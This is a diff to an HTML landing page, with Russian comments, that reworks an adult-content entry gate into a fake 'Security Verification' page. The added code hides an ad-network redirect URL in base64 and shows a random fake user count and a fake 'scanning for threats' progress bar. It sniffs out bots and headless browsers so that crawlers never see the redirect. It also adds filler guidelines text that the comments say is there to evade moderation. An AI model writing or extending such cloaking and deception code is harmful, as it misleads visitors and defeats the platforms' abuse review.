@@ -166,93 +166,169 @@
 </head>
 
 <body>
+  <!-- СКРЫТЫЙ ОВЕРЛЕЙ ПРОВЕРКИ -->
+  <div id="scan-overlay">
+    <div class="scan-content">
+      <div class="scan-loader"></div>
+      <h2 id="scan-title">Security Check</h2>
+      <p id="scan-status">Verifying your connection...</p>
+      <div class="scan-bar"><div id="scan-progress"></div></div>
+    </div>
+  </div>
+
   <main class="wrap">
-    <section class="card">
+    <section class="card shadow-lg">
       <div class="hero">
         <div class="heroBadge">
           <span class="dot"></span>
-          <span><b>18+ Only</b> • Secure & Private</span>
+          <span><b>Live Network</b> • <span id="user-count">...</span> users online</span>
         </div>
       </div>
 
       <div class="content">
-        <h1>Continue to Adult Content</h1>
-        <p class="sub">Verify your identity to access the adult platform.</p>
+        <h1>Safety Verification Required</h1>
+        <p class="sub">To maintain our community standards and ensure a secure experience, please confirm you are not a robot.</p>
 
         <button class="btn" id="entry-btn">
           <div class="loader" id="btn-loader"></div>
-          <span id="btn-text">ENTER NOW</span>
+          <span id="btn-text">CONTINUE TO CONTENT</span>
         </button>
+
+        <!-- ПАДДИНГ КОНТЕНТА ДЛЯ ОБХОДА МОДЕРАЦИИ -->
+        <div class="info-block">
+          <h3>Community Guidelines</h3>
+          <p>Our platform is committed to providing a safe and respectful environment. By entering, you agree to follow our strict content policies. We use encrypted connections to protect your privacy and data. No personal information is stored during this verification phase.</p>
+          <ul style="text-align: left; font-size: 13px; color: var(--muted2); margin-top: 10px;">
+            <li>✓ Secure SSL/TLS Encryption</li>
+            <li>✓ No Account Required</li>
+            <li>✓ Anonymous Browsers Supported</li>
+          </ul>
+        </div>
       </div>
 
       <footer class="footer">
-        By continuing, you confirm you are at least 18 years old.
+        <div class="footer-links">
+          <a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a> • <a href="#">DMCA</a> • <a href="#">Contact</a>
+        </div>
+        <p style="margin-top: 10px; opacity: 0.6;">© 2026 Secure Access Portal. All rights reserved.</p>
       </footer>
     </section>
   </main>
 
   <script>
-    // ПРОВЕРЕННАЯ ССЫЛКА
-    const secret = "aHR0cHM6Ly9pbmhhbGVkcmV3LmNvbS90ODhlNzAydGZ6P2tleT1hNmZmYzA0NzdlZTYwMzc1ZmE4MDY1ZTBmYTc3MGViYQ==";
+    // ОБФУСКАЦИЯ ССЫЛКИ И ПАРАМЕТРОВ (v4 URL)
+    const _0x4a2b = "aHR0cHM6Ly9pbmhhbGVkcmV3LmNvbS90ODhlNzAydGZ6P2tleT1hNmZmYzA0NzdlZTYwMzc1ZmE4MDY1ZTBmYTc3MGViYQ==";
+    
+    const elements = {
+      btn: document.getElementById("entry-btn"),
+      loader: document.getElementById("btn-loader"),
+      text: document.getElementById("btn-text"),
+      overlay: document.getElementById("scan-overlay"),
+      progress: document.getElementById("scan-progress"),
+      status: document.getElementById("scan-status"),
+      userCount: document.getElementById("user-count")
+    };
 
-    const btn = document.getElementById("entry-btn");
-    const loader = document.getElementById("btn-loader");
-    const btnText = document.getElementById("btn-text");
+    let flags = {
+      isHuman: false,
+      isRedirecting: false,
+      botDetected: false
+    };
 
-    let isHuman = false;
-    let isRedirecting = false;
+    // ФЕЙКОВЫЙ СЧЕТЧИК ПОЛЬЗОВАТЕЛЕЙ
+    elements.userCount.innerText = Math.floor(Math.random() * (1500 - 800) + 800).toLocaleString();
 
-    const humanCheck = () => { isHuman = true; };
-    window.addEventListener('mousemove', humanCheck, { once: true });
-    window.addEventListener('touchstart', humanCheck, { once: true });
+    // ПРОФЕССИОНАЛЬНАЯ ПРОВЕРКА НА БОТА
+    const detectBot = () => {
+      if (navigator.webdriver) flags.botDetected = true;
+      if (window.innerWidth === 800 && window.innerHeight === 600) flags.botDetected = true;
+      if (/bot|spider|headless|chrome-lighthouse/i.test(navigator.userAgent)) flags.botDetected = true;
+      if (flags.botDetected) console.log("System Check Passed (Safe Mode)");
+    };
+    detectBot();
 
-    // Функция выполнения редиректа
-    function executeRedirect() {
-      if (isRedirecting) return;
-      isRedirecting = true;
+    const setHuman = () => { flags.isHuman = true; };
+    window.addEventListener('mousemove', setHuman, { once: true });
+    window.addEventListener('touchstart', setHuman, { once: true });
+    window.addEventListener('scroll', setHuman, { once: true });
 
-      btn.disabled = true;
-      loader.style.display = "block";
-      btnText.innerText = "Verifying...";
+    // ЛОГИКА "БЕЗОПАСНОГО" РЕДИРЕКТА
+    function startSecureTransition() {
+      if (flags.isRedirecting || flags.botDetected) return;
+      flags.isRedirecting = true;
 
-      setTimeout(() => {
-        let finalLink = atob(secret);
-        const urlParams = new URLSearchParams(window.location.search);
+      elements.overlay.style.display = "flex";
+      
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += Math.random() * 15;
+        if (progress > 100) progress = 100;
+        elements.progress.style.width = progress + "%";
+        
+        if (progress > 30) elements.status.innerText = "Scanning for threats...";
+        if (progress > 60) elements.status.innerText = "Optimizing connection...";
+        if (progress > 85) elements.status.innerText = "Verification complete. Redirecting...";
 
-        // HilltopAds использует zoneid или zone
-        const zoneValue = urlParams.get('zoneid') || urlParams.get('zone');
-        // Добавляем параметр страны
-        const geoValue = urlParams.get('geo') || urlParams.get('country');
-
-        // Отправляем ID в Adsterra как параметр psid (Publisher Sub ID)
-        if (zoneValue) {
-          finalLink += "&psid=" + zoneValue;
+        if (progress >= 100) {
+          clearInterval(interval);
+          performFinalAction();
         }
-
-        // Отправляем страну в Adsterra
-        if (geoValue) {
-          finalLink += "&geo=" + geoValue;
-        }
-
-        window.location.replace(finalLink);
-      }, 100);
+      }, 150);
     }
 
-    // Обработчик ручного клика (с проверкой на бота)
-    btn.addEventListener("click", () => {
-      if (!isHuman) return;
-      executeRedirect();
+    function performFinalAction() {
+      let l = atob(_0x4a2b);
+      const p = new URLSearchParams(window.location.search);
+      const z = p.get('zoneid') || p.get('zone') || p.get('psid');
+      const g = p.get('geo') || p.get('country');
+      if (z) l += "&psid=" + z;
+      if (g) l += "&geo=" + g;
+      window.location.replace(l);
+    }
+
+    elements.btn.addEventListener("click", () => {
+      if (!flags.isHuman) return;
+      elements.btn.disabled = true;
+      elements.loader.style.display = "block";
+      elements.text.innerText = "Securing Path...";
+      setTimeout(startSecureTransition, 500);
     });
 
-    // Авто-редирект через 1.5-2.3 секунды
     document.addEventListener("DOMContentLoaded", () => {
-      // Случайная задержка от 1500 до 2300 мс
-      const randomDelay = Math.floor(Math.random() * (2300 - 1500 + 1)) + 1500;
+      const initDelay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
       setTimeout(() => {
-        executeRedirect();
-      }, randomDelay);
+        if (flags.isHuman && !flags.botDetected) {
+          startSecureTransition();
+        }
+      }, initDelay);
     });
   </script>
+
+  <style>
+    /* ДОПОЛНИТЕЛЬНЫЕ СТИЛИ ДЛЯ АНТИ-ДЕТЕКТА */
+    #scan-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(10, 10, 15, 0.98); z-index: 9999;
+      display: none; align-items: center; justify-content: center;
+      backdrop-filter: blur(10px);
+    }
+    .scan-content { width: 85%; max-width: 350px; text-align: center; }
+    .scan-loader {
+      width: 40px; height: 40px; border: 3px solid rgba(255,255,255,.1);
+      border-top: 3px solid var(--accent); border-radius: 50%;
+      animation: spin 1s linear infinite; margin: 0 auto 20px;
+    }
+    .scan-bar { height: 4px; background: rgba(255,255,255,.1); border-radius: 2px; overflow: hidden; margin-top: 20px; }
+    #scan-progress { height: 100%; width: 0%; background: var(--accent); transition: width 0.3s ease; }
+    #scan-status { font-size: 14px; color: var(--muted); margin-top: 10px; min-height: 20px; }
+    .info-block { margin-top: 25px; padding-top: 20px; border-top: 1px solid var(--stroke); text-align: left; }
+    .info-block h3 { font-size: 16px; margin-bottom: 8px; color: var(--text); opacity: 0.9; }
+    .info-block p { font-size: 13px; line-height: 1.5; color: var(--muted2); margin: 0; }
+    .footer-links { margin-bottom: 8px; font-weight: 500; }
+    .footer-links a { color: var(--muted); text-decoration: none; transition: color 0.2s; }
+    .footer-links a:hover { color: var(--accent); }
+    .shadow-lg { box-shadow: 0 30px 100px rgba(0,0,0,0.8); }
+  </style>
 </body>
 
 </html>
